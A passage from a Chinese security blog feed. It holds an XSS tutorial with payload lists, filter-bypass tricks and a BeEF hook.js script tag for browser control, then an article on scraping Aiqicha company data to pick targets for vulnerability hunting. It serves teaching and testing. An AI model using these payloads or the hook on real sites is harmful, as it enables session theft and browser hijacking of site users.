payload</p><ol><li>测试用户头像<code>&lt;img&gt;</code> &#x2F; 富文本区域的<code>&lt;img&gt;</code> <code>&lt;svg&gt;</code>标签(可控)</li><li>插入payload</li></ol><p>挖掘思路:</p><p>1.是否存在token和验证码,是否可以删除或伪造<br>2.是否可以删除或伪造referer<br>3.&lt;img&gt;&#x2F;&lt;svg&gt;等标签链接是否可控</p><p>常见漏洞点<br>1.修改密码 2.修改个人信息 3.发布文章 4.与账号相关的大部分业务功能点</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS基础</title>
      <link href="/2023/07/09/XSS%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/07/09/XSS%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS基础"><a href="#XSS基础" class="headerlink" title="XSS基础"></a>XSS基础</h1><p>XSS（跨站脚本攻击）是一种常见的Web应用程序安全漏洞，攻击者通过注入恶意脚本代码来利用该漏洞。下面是XSS漏洞的渲染过程：<br>    1.用户输入：攻击者通常通过网站上的输入字段（如表单、URL参数等）提供恶意脚本代码。<br>    2.服务器渲染：用户输入的数据在服务器端被接收，并在动态内容被生成和渲染页面之前进行处理。<br>    3.脚本注入：如果服务器端没有对用户输入进行适当的过滤和验证，恶意脚本代码将被注入到最终生成的HTML页面中。<br>    4.浏览器解析：用户访问该页面时，浏览器会解析HTML，并执行其中的JavaScript代码。<br>    5.恶意执行：恶意脚本代码执行，可能导致活动篡改、窃取个人敏感信息、会话劫持等危害。</p><h2 id="1-XSS种类："><a href="#1-XSS种类：" class="headerlink" title="1.XSS种类："></a><strong>1.XSS种类：</strong></h2><p>反射（主动触发</p><p>dom（主动触发</p><p>存储型（被动触发</p><h3 id="1-1-反射型"><a href="#1-1-反射型" class="headerlink" title="1.1.反射型"></a>1.<strong>1.反射型</strong></h3><p><strong>GET型</strong></p><p>创造一触发xss的页面后让其他用户点击</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">?message = <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">?meseage = <span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>POST型</strong></p><p>在post date里输入攻击代码</p><hr><h3 id="1-2-存储型"><a href="#1-2-存储型" class="headerlink" title="1.2.存储型"></a><strong>1.2.存储型</strong></h3><p>一般会把代码放在数据库中，危害很大</p><p>每个点击的用户都会被动触发</p><p>多留言板、弹幕、论坛</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">h<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>aha</span><br></pre></td></tr></table></figure><hr><h3 id="1-3-DOM型"><a href="#1-3-DOM型" class="headerlink" title="1.3.DOM型"></a>1.<strong>3.DOM型</strong></h3><p>dom型</p><p>和js有互动</p><p><strong>DOM-xss-1</strong></p><p>用js和前端进行互动</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;&#x27;</span>&gt;</span>what do you see?<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>法一</p><p>闭合写新标签</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">herf</span> = <span class="string">&#x27;#&#x27;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> = <span class="string">&#x27;#&#x27;</span> <span class="attr">onmouseover</span> = <span class="string">&quot;alert(&#x27;xss&#x27;)&quot;</span> &#x27;&gt;</span>what do you see?<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> = <span class="string">&#x27;#&#x27;</span> <span class="attr">onclick</span> = <span class="string">&quot;alert(&#x27;1&#x27;)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>法二</p><p>javascript协议</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;javascript:alert(1)&#x27;</span>&gt;</span>what do you see?<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>DOM-xss-x</strong></p><p>输入一个参数会被页面上的某些js函数进行处理，处理后再显示到页面</p><p>这种情况需要对js处理函数进行分析,构造payload</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">if</span>=<span class="string">&quot;xssd_main&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        function domxss()&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            var str = window.location.search;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            var txss = decodeURIComponent(str.split(&quot;text=&quot;)[1]);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            var xss = txss.replace(/\+/g,&#x27;&#x27;);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            alert(xss);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            document.getElementById(&quot;dom&quot;).innerHTML = &quot;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;&quot;+xss+&quot;&#x27;</span>&gt;</span>就让往事随风吧，都随风吧<span class="tag">&lt;/<span class="name">a</span>&gt;</span>&quot;;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        &#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        </span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">#&#x27;&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;#&#x27;</span> <span class="attr">onmouseover</span> = <span class="string">&quot;alert(1)&quot;</span></span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml"><span class="language-handlebars">&lt;<span class="attr">a</span> <span class="attr">href</span>=<span class="string">&#x27;#&#x27;</span> <span class="attr">onclick</span>=<span class="string">&#x27;domxss()&#x27;</span>&gt;</span>有些费尽心机想要忘记的事情,后来真的就忘掉了<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure><h2 id="2-XSSpayload构造"><a href="#2-XSSpayload构造" class="headerlink" title="2.XSSpayload构造"></a>2.XSSpayload构造</h2><h3 id="2-1常用标签"><a href="#2-1常用标签" class="headerlink" title="2.1常用标签"></a>2.1常用标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;img src=x onerror=&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;a href=&quot;javascript:alert(1)&quot;&gt;123&lt;/a&gt;</span><br><span class="line">&lt;body onload=&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;div onclick=&quot;alert(1)&quot;&gt;h&lt;/div&gt;</span><br><span class="line">&lt;svg onload=&quot;alert(1)&quot;&gt;&lt;/svg&gt;</span><br><span class="line">&lt;object onclick=&quot;alert(1)&quot;&gt;123&lt;/object&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; onfocus=&quot;alert(1)&quot; autofocus&gt;</span><br><span class="line">&lt;iframe src=&quot;javascript:alert(1);&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;button onclick=&quot;alert(1)&quot;&gt;click!&lt;/button&gt;</span><br><span class="line">&lt;details ontoggle=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="2-2常用on事件"><a href="#2-2常用on事件" class="headerlink" title="2.2常用on事件"></a>2.2常用on事件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">onclick=点击触发</span><br><span class="line">onload=加载触发</span><br><span class="line">onerror=报错触发</span><br><span class="line">onfocus=获得焦点触发</span><br><span class="line">onblur=失去焦点触发</span><br><span class="line">onmouseover=鼠标悬停</span><br><span class="line">onkeydown= onkeypress= onkeyup=  键盘操作触发</span><br><span class="line">onchange=内容改变触发</span><br><span class="line">onscroll=滚动条滚动触发</span><br></pre></td></tr></table></figure><h3 id="2-3常用测试函数"><a href="#2-3常用测试函数" class="headerlink" title="2.3常用测试函数"></a>2.3常用测试函数</h3><p>src挖掘</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">console.log()</span><br></pre></td></tr></table></figure><p>弹窗</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alert()</span><br><span class="line">confirm()</span><br><span class="line">prompt()</span><br></pre></td></tr></table></figure><h2 id="4-常用绕过方式"><a href="#4-常用绕过方式" class="headerlink" title="4.常用绕过方式"></a>4.常用绕过方式</h2><p>1.大小写绕过</p><p>外部标签无视大小写，内部的js代码是大小写敏感的</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">scRiPT</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2.双写绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/sc&lt;/script&gt;ript&gt;</span><br></pre></td></tr></table></figure><p>3.注释绕过</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--    --&gt;</span></span><br><span class="line">&lt;scr<span class="comment">&lt;!-- abc --&gt;</span>ipt&gt;alert<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>4.过滤圆括号(),用反引号&#96;&#96;替代</p><p>5.使用svg实体字符编码</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">alert<span class="symbol">&amp;#40;</span>1<span class="symbol">&amp;#41;</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>6.换行逃逸js匹配</p><p>7.单标签不写右标签</p><p>8.输入内容全大写- 远程js</p><p>9.使用长英语绕过</p><p>10.编码绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;&gt;() 尝试单词或多次url编码</span><br><span class="line">&quot;[内容]&quot; 双引号的内容尝试unicode编码</span><br><span class="line">&lt;object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&gt;&lt;/object&gt; base64编码</span><br></pre></td></tr></table></figure><p>11.payload长度受限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.短域名</span><br><span class="line">2.&lt;svg/onload=alert(1)</span><br></pre></td></tr></table></figure><p>12.空格绕过<br>用+或&#x2F;**&#x2F;</p><h2 id="5-XSS危害与防御"><a href="#5-XSS危害与防御" class="headerlink" title="5.XSS危害与防御"></a>5.XSS危害与防御</h2><p>XSS危害</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">盗取cookie</span><br><span class="line"></span><br><span class="line">植入键盘记录器。</span><br><span class="line"></span><br><span class="line">攻击受害者所在的局域网。</span><br><span class="line"></span><br><span class="line">代理转发流经被攻击者的所有 Web 流量，即实施中间人攻击。</span><br><span class="line"></span><br><span class="line">窃取或篡改应用 cookie 用于会话劫持。</span><br><span class="line"></span><br><span class="line">更改被攻击者 Web 应用的显示内容。</span><br><span class="line"></span><br><span class="line">绕过 CSRF 安全防护措施。</span><br><span class="line"></span><br><span class="line">创建包含恶意 JavaScript 代码的虚假网站以及到该网站页面的链接。</span><br><span class="line"></span><br><span class="line">发送嵌入恶意 Web URL 的电子邮件。</span><br><span class="line"></span><br><span class="line">使用 URL 短码隐蔽真实 URL。</span><br></pre></td></tr></table></figure><p>XSS防御</p><p><a href="https://zhuanlan.zhihu.com/p/262038810">https://zhuanlan.zhihu.com/p/262038810</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">html回显内容在html页面标签之外时，实体化左右尖括号</span><br><span class="line">html回显内容在&lt;script&gt;代码快时，实体化左右尖括号、“/”、单引号等可能闭合标签的字符</span><br><span class="line">html回显内容通过postmessage作为输入点时 检测messageEvent的来源是否在白名单内，同时检测来源数据是否合法，是否存在恶意代码</span><br></pre></td></tr></table></figure><h2 id="6-XSS平台"><a href="#6-XSS平台" class="headerlink" title="6.XSS平台"></a>6.XSS平台</h2><h3 id="1-beef-xsss"><a href="#1-beef-xsss" class="headerlink" title="1.beef-xsss"></a>1.beef-xsss</h3><h4 id="1-安装登录"><a href="#1-安装登录" class="headerlink" title="1.安装登录"></a>1.安装登录</h4><p>安装beef-xss</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line"></span><br><span class="line">beef-xss 之后默认走流程</span><br><span class="line"></span><br><span class="line">beef-xss打开</span><br><span class="line">在<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">3000</span>/ui/authentication登录</span><br></pre></td></tr></table></figure><p>默认用户名beef 密码pass</p><h4 id="2-使用"><a href="#2-使用" class="headerlink" title="2.使用"></a>2.使用</h4><p>src 连接到本地beef-xss</p><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;http://192.168.89.129:3000/hook.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>运行后beef-xss上线<br>找到对方的前端代码，然后插入自己的js攻击代码<br>Current Browser → Commands 可以运行多种命令</p><h3 id="2-xss-pt"><a href="#2-xss-pt" class="headerlink" title="2.xss.pt"></a>2.xss.pt</h3><p><a href="https://xss.pt/xss.php">https://xss.pt/xss.php</a></p><p>创建项目</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307101339963.png" alt="img"></p><p>选择相应模式后会返回payload</p><p>![image-20230710134207726](E:\网络安全\Xrect1fy’s note\assets\image-20230710134207726.png)</p><p>将payload运行</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307101345101.png" alt="img"></p><h2 id="7-常用工具推荐"><a href="#7-常用工具推荐" class="headerlink" title="7.常用工具推荐"></a>7.常用工具推荐</h2><h3 id="1-XSStrike"><a href="#1-XSStrike" class="headerlink" title="1.XSStrike"></a>1.XSStrike</h3><p>项目地址:<a href="https://github.com/s0md3v/XSStrike">https://github.com/s0md3v/XSStrike</a></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">python xsstrike.<span class="property">py</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">usage</span>: xsstrike.<span class="property">py</span> [-h] [-u <span class="variable constant_">TARGET</span>] [--data <span class="variable constant_">DATA</span>] [-t <span class="variable constant_">THREADS</span>] [--seeds <span class="variable constant_">SEEDS</span>] [--json] [--path]</span><br><span class="line">                   [--fuzzer] [--update] [--timeout] [--params] [--crawl] [--blind]</span><br><span class="line">                   [--skip-dom] [--headers] [--proxy] [-d <span class="variable constant_">DELAY</span>] [-e <span class="variable constant_">ENCODING</span>]</span><br><span class="line"> </span><br><span class="line">optional <span class="attr">arguments</span>:</span><br><span class="line">  -h, --help            show <span class="variable language_">this</span> help message and exit</span><br><span class="line">  -u, --url             target url</span><br><span class="line">  --data                post data</span><br><span class="line">  -f, --file            load payloads <span class="keyword">from</span> a file</span><br><span class="line">  -t, --threads         number <span class="keyword">of</span> threads</span><br><span class="line">  -l, --level           level <span class="keyword">of</span> crawling</span><br><span class="line">  -t, --encode          payload encoding</span><br><span class="line">  --json                treat post data <span class="keyword">as</span> json</span><br><span class="line">  --path                inject payloads <span class="keyword">in</span> the path</span><br><span class="line">  --seeds               load urls <span class="keyword">from</span> a file <span class="keyword">as</span> seeds</span><br><span class="line">  --fuzzer              fuzzer</span><br><span class="line">  --update              update</span><br><span class="line">  --timeout             timeout</span><br><span class="line">  --params              find params</span><br><span class="line">  --crawl               crawl</span><br><span class="line">  --proxy               use <span class="title function_">prox</span>(y|ies)</span><br><span class="line">  --blind               inject blind xss payloads <span class="keyword">while</span> crawling</span><br><span class="line">  --skip                skip confirmation dialogue and poc</span><br><span class="line">  --skip-dom            skip dom checking</span><br><span class="line">  --headers             add headers</span><br><span class="line">  -d, --delay           delay between requests</span><br></pre></td></tr></table></figure><h3 id="2-XSSpayload"><a href="#2-XSSpayload" class="headerlink" title="2.XSSpayload"></a>2.XSSpayload</h3><p>一种xss fuzz爆破方式</p><p><a href="https://github.com/TheKingOfDuck/easyXssPayload">https://github.com/TheKingOfDuck/easyXssPayload</a></p><p>放入payload看弹窗数字确定payload行数。</p><h3 id="3-Burpsuite-XSS-Validator插件"><a href="#3-Burpsuite-XSS-Validator插件" class="headerlink" title="3.Burpsuite XSS Validator插件"></a>3.Burpsuite XSS Validator插件</h3><h4 id="1-安装"><a href="#1-安装" class="headerlink" title="1.安装"></a>1.安装</h4><p>1.phantomjs下载</p><p><a href="http://phantomjs.org/download.html">http://phantomjs.org/download.html</a></p><p>将phantomjs所在的bin目录添加到环境变量</p><p>下载xss.js,将其放到和phantomjs.exe一个目录中</p><p><a href="https://github.com/NetSPI/xssValidator/blob/master/xss-detector/xss.js">https://github.com/NetSPI/xssValidator/blob/master/xss-detector/xss.js</a></p><p>运行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phantomjs.exe xss.js</span><br></pre></td></tr></table></figure><p>2.安装插件</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307101352302.png" alt="img"></p><h4 id="2-使用-1"><a href="#2-使用-1" class="headerlink" title="2.使用"></a>2.使用</h4><p>1.用bp抓包send to intruder</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307101428475.png"></p><p>2.配置变量</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307101430632.png"></p><p>3.配置GREP-MATCH</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307101433439.png"></p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307101434106.png"></p><p>4.启动扫描</p><p>参考文章:</p><p><a href="https://www.freesion.com/article/77561513173/">burpsuite插件xssValidator的安装及使用（XSS自动扫描工具）</a></p><h3 id="4-payload大全"><a href="#4-payload大全" class="headerlink" title="4.payload大全"></a>4.payload大全</h3><p><a href="https://www.cnblogs.com/xiaozi/p/7268506.html">XSSpayload大全</a></p><h2 id="8-参考文章"><a href="#8-参考文章" class="headerlink" title="8.参考文章"></a>8.参考文章</h2><p><a href="https://wiki.sheep0818.xyz/doc/151/">XSS CSRF SSRF</a></p><p><a href="https://www.52dianzi.com/category/article/37/625025.html">Xss Bypass备忘录</a></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>爬虫实战-爬取爱企查企业数据</title>
      <link href="/2023/07/05/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%88%AC%E5%8F%96%E7%88%B1%E4%BC%81%E6%9F%A5%E6%95%B0%E6%8D%AE/"/>
      <url>/2023/07/05/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%88%AC%E5%8F%96%E7%88%B1%E4%BC%81%E6%9F%A5%E6%95%B0%E6%8D%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h1><p>​爱企查是百度推出的企业信息查询工具，可快速查询企业相关信息。在平时测试时，测试人员需要收集大量的企业信息，可以借助爬虫爬取爱企查网站实现。</p><p>​在挖通用型CNVD时 ，一般需要满足企业注册资金在5000w以上，本文演示爬取满足注册资金在5000w以上的企业信息。</p><h1 id="2-分析思路"><a href="#2-分析思路" class="headerlink" title="2.分析思路"></a>2.分析思路</h1><p>1.登录爱企查，筛选企业类型为</p><ul><li>注册资金在5000万以上</li><li>资本类型为人民币</li><li>企业状态为开业</li></ul><p><a href="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011543018.png"></a></p><p>2.进入网站后尝试从源码中取出广州市荔湾区华强电动设备行越秀分行</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011544160.png" alt="image.png"></p><p>发现查询失败：<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011544919.png" alt="image.png"></p><p>尝试f12抓包看请求<br>发现包内容过多。</p><p>3.选择去爬企业名称和注册资本</p><p>点击下方的页面索引：<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011545837.png" alt="image.png"></p><p>查看抓到的包的访问payload<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011546571.png" alt="image.png"></p><p>尝试多访问几页<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011546613.png" alt="image.png"><br>发现payload基本一致<br>p:代表页数<br>f:代表筛选的数据信息</p><p>4.查看Response包（部分)</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">https<span class="punctuation">:</span><span class="comment">//aiqicha.baidu.com/s/advanceSearchAjax?p=2&amp;s=10&amp;f=%7B%22regCap%22:[%7B%22start%22:5000,%22end%22:0%7D],%22regCapType%22:[%221%22],%22openStatus%22:[%22%E5%BC%80%E4%B8%9A%22]%7D&amp;o=0</span></span><br><span class="line">https<span class="punctuation">:</span><span class="comment">//aiqicha.baidu.com/s/advanceSearchAjax?p=2&amp;s=10&amp;f=%7B%22regCap%22:[%7B%22start%22:5000,%22end%22:0%7D],%22regCapType%22:[%221%22],%22openStatus%22:[%22%E5%BC%80%E4%B8%9A%22]%7D&amp;o=0</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;status&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;qType&quot;</span><span class="punctuation">:</span> <span class="number">111</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;queryStr&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;pageNum&quot;</span><span class="punctuation">:</span> <span class="number">3</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;resultList&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;pid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;91770835364651&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;entName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u6d59\u6c5f\u4e49\u94ed\u5efa\u7b51\u52b3\u52a1\u6709\u9650\u516c\u53f8&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;entType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u6709\u9650\u8d23\u4efb\u516c\u53f8(\u81ea\u7136\u4eba\u6295\u8d44\u6216\u63a7\u80a1)&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;validityFrom&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2018-08-22&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;domicile&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u6d59\u6c5f\u7701\u676d\u5dde\u5e02\u94b1\u5858\u65b0\u533a\u4e07\u4e9a\u540d\u57ce2\u5e62715\u5ba4&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;entLogo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;openStatus&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u5f00\u4e1a&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;legalPerson&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u5415\u7956\u5f3a&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;tags&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;logoWord&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u4e49\u94ed\u5efa\u7b51&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;hkLable&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;isHkComp&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;isClaim&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;titleName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u6d59\u6c5f\u4e49\u94ed\u5efa\u7b51\u52b3\u52a1\u6709\u9650\u516c\u53f8&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;titleLegal&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u5415\u7956\u5f3a&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;titleDomicile&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u6d59\u6c5f\u7701\u676d\u5dde\u5e02\u94b1\u5858\u65b0\u533a\u4e07\u4e9a\u540d\u57ce2\u5e62715\u5ba4&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;regCap&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1,011,000,000.0\u4e07&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;scope&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u8bb8\u53ef\u9879\u76ee\uff1a\u623f\u5c4b\u5efa\u7b51\u548c\u5e02\u653f\u57fa\u7840\u8bbe\u65bd\u9879\u76ee\u5de5\u7a0b\u603b\u627f\u5305\uff1b\u5404\u7c7b\u5de5\u7a0b\u5efa\u8bbe\u6d3b\u52a8\uff1b\u7535\u6c14\u5b89\u88c5\u670d\u52a1\uff1b\u5efa\u7b51\u52b3\u52a1\u5206\u5305\uff1b\u4eba\u9632\u5de5\u7a0b\u9632\u62a4\u8bbe\u5907\u5236\u9020(\u4f9d\u6cd5\u987b\u7ecf\u6279\u51c6\u7684\u9879\u76ee\uff0c\u7ecf\u76f8\u5173\u90e8\u95e8\u6279\u51c6\u540e\u65b9\u53ef\u5f00\u5c55\u7ecf\u8425\u6d3b\u52a8\uff0c\u5177\u4f53\u7ecf\u8425\u9879\u76ee\u4ee5\u5ba1\u6279\u7ed3\u679c\u4e3a\u51c6)\u3002\u4e00\u822c\u9879\u76ee\uff1a\u5de5\u7a0b\u7ba1\u7406\u670d\u52a1\uff1b\u4f4f\u5b85\u6c34\u7535\u5b89\u88c5\u7ef4\u62a4\u670d\u52a1\uff1b\u516c\u8def\u6c34\u8fd0\u5de5\u7a0b\u8bd5\u9a8c\u68c0\u6d4b\u670d\u52a1\uff1b\u8f68\u9053\u4ea4\u901a\u4e13\u7528\u8bbe\u5907\u3001\u5173\u952e\u7cfb\u7edf\u53ca\u90e8\u4ef6\u9500\u552e\uff1b\u627f\u63a5\u603b\u516c\u53f8\u5de5\u7a0b\u5efa\u8bbe\u4e1a\u52a1\uff1b\u571f\u77f3\u65b9\u5de5\u7a0b\u65bd\u5de5\uff1b\u56ed\u6797\u7eff\u5316\u5de5\u7a0b\u65bd\u5de5\uff1b\u57ce\u5e02\u7eff\u5316\u7ba1\u7406\uff1b\u82b1\u5349\u7eff\u690d\u79df\u501f\u4e0e\u4ee3\u7ba1\u7406\uff1b\u9632\u8150\u6750\u6599\u9500\u552e\uff1b\u4e94\u91d1\u4ea7\u54c1\u96f6\u552e\uff1b\u4e94\u91d1\u4ea7\u54c1\u6279\u53d1\uff1b\u91d1\u5c5e\u6750\u6599\u9500\u552e\uff1b\u5efa\u7b51\u6750\u6599\u9500\u552e\uff1b\u6d82\u6599\u5236\u9020\uff08\u4e0d\u542b\u5371\u9669\u5316\u5b66\u54c1\uff09\uff1b\u91d1\u5c5e\u7ed3\u6784\u9500\u552e\uff1b\u5efa\u7b51\u7528\u94a2\u7b4b\u4ea7\u54c1\u9500\u552e\uff1b\u91d1\u5c5e\u7ed3\u6784\u5236\u9020(\u9664\u4f9d\u6cd5\u987b\u7ecf\u6279\u51c6\u7684\u9879\u76ee\u5916\uff0c\u51ed\u8425\u4e1a\u6267\u7167\u4f9d\u6cd5\u81ea\u4e3b\u5f